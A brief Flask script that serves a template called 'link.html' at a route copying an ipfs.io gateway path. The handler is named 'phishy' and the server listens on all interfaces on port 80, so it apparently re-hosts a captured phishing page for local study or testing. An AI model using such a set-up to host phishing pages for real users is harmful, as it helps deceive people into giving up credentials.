from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='ipfs.io/ipfs/bafybeigeofyv7v5so47uuyoo25ks3yigtdtvykyz37kzzwyo6un6bvtzrq')

@app.route('/ipfs/bafybeigeofyv7v5so47uuyoo25ks3yigtdtvykyz37kzzwyo6un6bvtzrq/link.html')
def phishy():
    return render_template('link.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)